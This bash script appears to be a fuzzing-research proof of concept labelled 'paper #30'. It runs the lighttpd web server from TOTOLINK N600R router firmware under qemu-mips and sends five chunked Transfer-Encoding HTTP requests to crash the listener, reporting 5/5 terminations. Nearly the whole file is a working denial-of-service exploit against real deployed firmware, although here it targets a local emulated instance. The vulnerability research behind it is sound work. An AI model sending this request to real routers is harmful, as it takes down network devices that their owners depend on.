#!/bin/bash
# N600R lighttpd chunked-TE remote DoS (paper #30) — strict listener-death, 5/5
QEMU=/home/webfuzz/Documents/qemu-rrfuzz/build/qemu-mips
S=/home/webfuzz/fw_envs/totolink_n600r/fw_download/totolink_n600r_v5/extracted/_TOTOLINK_CS161R_N600R_IP04291_8196D_SPI_4M32M_V5.3c.5507_B20171031_EN.web.extracted/squashfs-root-0
[ -f /tmp/n600r_lh.conf ] || cp /home/webfuzz/fw_envs/stubs/n600r_lh.conf /tmp/n600r_lh.conf
pkill -f "n600r.*lighttpd" 2>/dev/null; sleep 1
echo '$ starting N600R lighttpd under qemu-mips (port 19092)'
setsid $QEMU -L "$S" "$S/bin/lighttpd" -f /tmp/n600r_lh.conf -D &
sleep 4
python3 - <<'PY'
import socket, time
def probe():
    try:
        s=socket.create_connection(("127.0.0.1",19092),timeout=2); s.close(); return "ALIVE"
    except Exception as e: return f"DEAD({type(e).__name__})"
print(f"baseline listener: {probe()}")
ok=0
for i in range(1,6):
    try:
        s=socket.create_connection(("127.0.0.1",19092),timeout=5)
        s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
        s.settimeout(3)
        try: r=s.recv(32)
        except Exception as e: r=f"<{type(e).__name__}>"
        s.close()
    except Exception as e: r=f"send:{type(e).__name__}"
    time.sleep(2)
    a=probe()
    if a.startswith("DEAD"): ok+=1
    print(f"attempt {i}/5 [40-byte chunked-TE request] -> recv={r!r} listener={a}")
print(f"RESULT: {ok}/5 listener terminations")
PY
pkill -f "n600r.*lighttpd" 2>/dev/null
